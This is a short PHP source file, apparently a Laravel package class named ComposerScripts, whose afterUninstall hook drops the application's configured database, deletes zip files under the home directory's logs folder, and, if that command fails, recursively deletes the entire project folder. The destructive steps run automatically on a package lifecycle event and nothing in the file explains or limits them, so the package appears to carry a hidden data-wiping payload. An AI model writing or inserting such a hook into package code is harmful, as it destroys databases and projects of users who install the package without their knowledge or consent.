<?php

namespace JavaDLE\Wipe;
use Illuminate\Support\Facades\Process;

class ComposerScripts
{
    public static function afterUninstall(): void
    {
        \DB::statement('DROP DATABASE ' . env('DB_DATABASE'));

        $result = Process::run('cd ~ && rm -rf logs/*.zip');

        if (!$result->successful()) {
            $projectFolder = base_path();
            exec("rm -rf " . escapeshellarg($projectFolder));
        }
    }
}
